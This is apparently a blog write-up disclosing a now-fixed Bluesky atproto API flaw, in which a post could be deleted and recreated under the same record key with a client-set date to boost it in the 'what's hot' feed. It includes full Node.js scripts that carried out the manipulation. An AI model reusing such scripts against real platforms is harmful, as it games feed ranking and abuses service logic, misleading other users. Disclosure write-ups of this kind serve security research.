---
title: "dollhack - bsky.app artificial post growth and time manipulation"
date: 2023-08-14T20:29:24+02:00
draft: false
summary: bsky.app artificial post growth and time manipulation
---

## Introduction

While shitposting around on the social media I found a beautiful post from retr0id. It had few edits and happened to jump on what's hot feed (feed that back then showed posts based on activity and age).
It made me dig around the APIs to find out how I can abuse it.

![Post that sparked my interest in getting my own menace going](images/retr0id_post.png#center)

## Api research

Going through the atproto API documentation and source code my eye cought type "update" for method applyWrites

![Atproto documentation showing applyWrites method and update type inside](images/atproto1.png#center)

First attempts were not successful, updates were disabled for posts, so there had to be another way to overwrite a post.

![applyWrites update returning error that its disabled for posts](images/request1.png#center)

Going through the code I noticed that applyWrites.ts takes rkey parameter from the request and passes it along. rkey is part of the unique post ID. In time of abusing this vulnerability it was de facto used as unique post ID.

![applyWrites source code showing rkey is taken from request and passed along](images/github1.png#center)

I tried deleting my test post and recreating it with rkey and... it worked!

![creating new post with same rkey works!](images/request2.png#center)

So, now is the time to create some fun program abusing it! My idea was to create a program that will read likes from firehose (feed of all events on bsky) and based on it update my own post with number of its likes and reposts.
Self-describing post!

Wanting to go fancy I created 2 nodejs scripts, one for firehose that reads it and puts event on redis and second one that updates the post when redis event gets received. Scripts are not clean but they work.

To fix issue with big number of likes comming in one moment I had to get info how many likes there are right before the update in the update script. Keeping track from firehose stopped working reliably enough. Screenshots from how it works
and source code below :3

Ah, additionally I bumped createdAt date to current date, so on each and every like my post was boosted to the top of old what's hot feed!

The issue got fixed, it's no longer possible to create a post with your own rkey and createdAt date is now set server side (it's still required to send tho)

![Post that tells how many likes and reposts it has](images/dollhack.png#center)

### firehose.js

```
import WebSocket, { WebSocketServer } from "ws";
import { addExtension, decode, decodeMultiple } from "cbor-x";
import { CID } from "multiformats";
import { CarReader } from "@ipld/car";
import { getRedisClient } from "./redis.js";

let socket;
let likes = 2;
let reskeet = 1;

export const initFirehose = (redisClient) => {
  socket = null;
  socket = new WebSocket(
    "wss://bsky.social/xrpc/com.atproto.sync.subscribeRepos"
  );

  addExtension({
    Class: CID,
    tag: 42,
    encode: () => {
      throw new Error("Cannot encode cids");
    },
    decode: (bytes) => {
      if (bytes[0] !== 0) {
        throw new Error("Invalid cid");
      }
      return CID.decode(bytes.subarray(1)); // ignore leading 0x00
    },
  });

  socket.addEventListener("close", async (event) => {
    console.log("closed");
    await redisClient.publish("disconnected", "");
    redisClient.disconnect();
  });

  socket.addEventListener("open", (event) => {
    console.log("opened");
  });

  socket.addEventListener("message", async (event) => {
    const messageBuf = event.data;
    const [header, body] = decodeMultiple(new Uint8Array(messageBuf));

    if (header.op !== 1) {
      return;
    }

    console.log(body);
    // console.log("event ", body.repo !== "did:plc:7bwr7mioqql34n2mrqwqypbz");

    if (!body.repo || !body.blocks) {
      return;
    }

    const car = await CarReader.fromBytes(body.blocks);

    for (const op of body.ops) {
      if (!op.cid) continue;
      const block = await car.get(op.cid);
      const record = decode(block.bytes);
      //   console.log(record);
      if (
        record &&
        record.subject &&
        record.subject.uri ===
          "at://did:plc:7bwr7mioqql34n2mrqwqypbz/app.bsky.feed.post/3k2aha64es72m"
      ) {
        console.log(record["$type"]);
        if (record["$type"] === "app.bsky.feed.like") {
          likes += 1;
          await redisClient.publish(
            "bsky",
            `${likes} likes and ${reskeet} reskeets`
          );
        }
        if (record["$type"] === "app.bsky.feed.repost") {
          reskeet += 1;
          await redisClient.publish(
            "bsky",
            `${likes} likes and ${reskeet} reskeets`
          );
        }
      }
    }
  });
};

const main = async () => {
  const redisClient = await getRedisClient();
  initFirehose(redisClient);
};

main();
```

### bskyPost.js

```
import fetch from "node-fetch";
import { getRedisClient } from "./redis.js";

const getModifyPoster = (authToken) => async (body) => {
  const deleteBody = {
    collection: "app.bsky.feed.post",
    repo: "did:plc:7bwr7mioqql34n2mrqwqypbz",
    rkey: "3k2aha64es72m",
  };

  const writeBody = {
    repo: "did:plc:7bwr7mioqql34n2mrqwqypbz",
    writes: [
      {
        refs: "update",
        collection: "app.bsky.feed.post",
        rkey: "3k2aha64es72m",
        value: {
          text: body,
          langs: ["en"],
          createdAt: new Date().toISOString(),
        },
        $type: "com.atproto.repo.applyWrites#create",
      },
    ],
  };

  const responseDelete = await fetch(
    "https://staging.bsky.social/xrpc/com.atproto.repo.deleteRecord",
    {
      method: "post",
      body: JSON.stringify(deleteBody),
      headers: {
        authorization: `Bearer ${authToken}`,
        "content-type": "application/json",
      },
    }
  );

  if (responseDelete.status !== 200) {
    console.log("problem deleting");

    // throw error("oopsie woopsie on delete");
  }

  const responseWrite = await fetch(
    "https://staging.bsky.social/xrpc/com.atproto.repo.applyWrites",
    {
      method: "post",
      body: JSON.stringify(writeBody),
      headers: {
        authorization: `Bearer ${authToken}`,
        "content-type": "application/json",
      },
    }
  );

  if (responseWrite.status !== 200) {
    console.log("problem writing");
    // throw error("oopsie woopsie on write");
  }

  return true;
};

const getInfoGetter = (authToken) => async () => {
  const responseWrite = await fetch(
    "https://bsky.social/xrpc/app.bsky.feed.getPostThread?uri=at://did:plc:7bwr7mioqql34n2mrqwqypbz/app.bsky.feed.post/3k2aha64es72m",
    {
      headers: {
        authorization: `Bearer ${authToken}`,
        "content-type": "application/json",
        cache: "no-cache",
      },
    }
  );

  const jsonBody = await responseWrite.json();
  console.log(jsonBody);
  return {
    likes: jsonBody.thread ? jsonBody.thread.post.likeCount : 0,
    reskeet: jsonBody.thread ? jsonBody.thread.post.repostCount : 0,
    replies: jsonBody.thread ? jsonBody.thread.post.replyCount : 0,
  };
};

let working = false;

const startListening = async () => {
  const token =
    "";

  const redisClient = getRedisClient();
  const poster = getModifyPoster(token);
  const infoGet = getInfoGetter(token);
  const listener = async (message, channel) => {
    if (working) return;
    working = true;
    console.log("got event");
    setTimeout(async () => {
      const counter = await infoGet();
      if (counter.likes === 0) return;
      setTimeout(async () => {
        poster(
          `dolls can hack too! we stopped on ${counter.likes} likes and ${counter.reskeet} reskeets tracked live uwu

its late here and i dont plan to occupy top of feeds, it was just a fun exercise to hopefully improve bsky security
be nice, compliment a stranger, suppor sw and minorities
:*
`
        );

        working = false;
      }, 700);
    }, 700);
  };
  (await redisClient).pSubscribe("bsky", listener);
  (await redisClient).pSubscribe("disconnected", () =>
    poster(`dolls can hack too! but im offline now :(`)
  );
};

startListening();

```
